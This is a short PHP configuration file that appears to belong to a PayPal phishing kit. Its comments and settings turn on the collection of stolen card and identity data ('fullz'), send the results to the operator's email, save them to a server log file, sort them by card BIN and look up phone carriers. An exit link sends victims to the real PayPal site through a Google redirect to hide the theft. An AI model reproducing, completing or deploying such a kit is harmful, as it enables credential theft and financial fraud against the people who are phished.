<?php

//Systems:

// - Carrier lookup in results (Already activated)
// - Bin List (Change '0' from $binList to '1' to activate)
// - Send results via email (Change '0' from $sendEmail to '1' to activate)
// - Save results on server (Change '0' from $saveFile to '1' to activate) => assets/logs/fullz.txt
// - Save results in separated files clased by BIN (Change '0' from $binSave to '1' to activate)


$saveFile = 1;
$sendEmail = 1;
$binList = 1;
$One_Time_Access = 1;
$binSave = 1;



$to = "your email"; //Your e-mail address to receive fullz
$ExitLink = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwib2t2z_K7fAhVkSRUIHcYjCMAQFjAAegQIAxAC&url=https%3A%2F%2Fwww.paypal.com%2Fuk%2Fhome&usg=AOvVaw0bJ7fG7mk5yia5upCsbFyP"; // Real site via google redirect

?>